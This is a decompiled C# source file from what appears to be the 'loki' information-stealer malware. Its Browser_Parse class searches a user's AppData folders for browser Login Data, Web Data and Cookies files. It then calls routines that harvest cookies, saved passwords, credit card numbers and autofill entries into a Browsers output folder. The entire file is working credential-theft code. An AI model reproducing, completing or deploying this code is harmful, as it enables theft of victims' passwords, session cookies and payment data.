using System;
using System.Collections.Generic;
using System.IO;
using Anubis;
using loki.loki.Stealer.Cookies;
using loki.loki.Stealer.Credit_Cards;
using loki.loki.Stealer.Passwords;
using loki.loki.Stealer.WebData;

namespace loki.loki
{
	// Token: 0x02000023 RID: 35
	internal class Browser_Parse
	{
		// Token: 0x06000153 RID: 339 RVA: 0x00008460 File Offset: 0x00006660
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files != null && files.Length != 0 && level <= maxLevel)
			{
				try
				{
					foreach (string path in Directory.GetDirectories(baseDirectory))
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag = false;
							foreach (FileInfo fileInfo in files2)
							{
								if (flag)
								{
									break;
								}
								foreach (string text in files)
								{
									if (flag)
									{
										break;
									}
									string a = text;
									FileInfo fileInfo2 = fileInfo;
									if (a == fileInfo2.Name)
									{
										flag = true;
										list.Add(fileInfo2.FullName);
									}
								}
							}
							foreach (string item in Browser_Parse.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								if (!list.Contains(item))
								{
									list.Add(item);
								}
							}
						}
						catch
						{
						}
					}
					return list;
				}
				catch
				{
					return list;
				}
				return list;
			}
			return list;
		}

		// Token: 0x06000154 RID: 340 RVA: 0x000085AC File Offset: 0x000067AC
		private static List<string> GetProfile()
		{
			List<string> list = new List<string>();
			List<string> result;
			try
			{
				list.AddRange(Browser_Parse.FindPaths(Browser_Parse.RoamingAppData, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				list.AddRange(Browser_Parse.FindPaths(Browser_Parse.LocalAppData, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				result = list;
			}
			catch
			{
				result = list;
			}
			return result;
		}

		// Token: 0x06000155 RID: 341 RVA: 0x0000863C File Offset: 0x0000683C
		private static string GetRoadData(string path)
		{
			try
			{
				return path.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000156 RID: 342 RVA: 0x00008690 File Offset: 0x00006890
		private static string GetLclName(string path)
		{
			try
			{
				string[] array = path.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_" + array[1];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000157 RID: 343 RVA: 0x000086F4 File Offset: 0x000068F4
		private static string GetName(string path)
		{
			try
			{
				string[] array = path.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[array.Length - 2] == "User Data")
				{
					return array[array.Length - 1];
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00008750 File Offset: 0x00006950
		public static void Parse(string dir)
		{
			Directory.CreateDirectory(dir + "\\Browsers");
			Steal.Cookies();
			try
			{
				foreach (string text in Browser_Parse.GetProfile())
				{
					try
					{
						string fullName = new FileInfo(text).Directory.FullName;
						string text2 = text.Contains(Browser_Parse.RoamingAppData) ? Browser_Parse.GetRoadData(fullName) : Browser_Parse.GetLclName(fullName);
						if (!string.IsNullOrEmpty(text2))
						{
							text2 = text2[0].ToString().ToUpper() + text2.Remove(0, 1);
							string name = Browser_Parse.GetName(fullName);
							GetCookies.Cookie_Grab(fullName, text2, name);
							GetPasswords.Passwords_Grab(fullName, text2, name);
							GetPasswords.Write_Passwords();
							Get_Credit_Cards.Get_CC(fullName, text2, name);
							Get_Credit_Cards.Write_CC(text2, name);
							Get_Browser_Autofill.Get_Autofill(fullName, text2, name);
							Get_Browser_Autofill.Write_Autofill(text2, name);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000068 RID: 104
		public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

		// Token: 0x04000069 RID: 105
		public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
	}
}
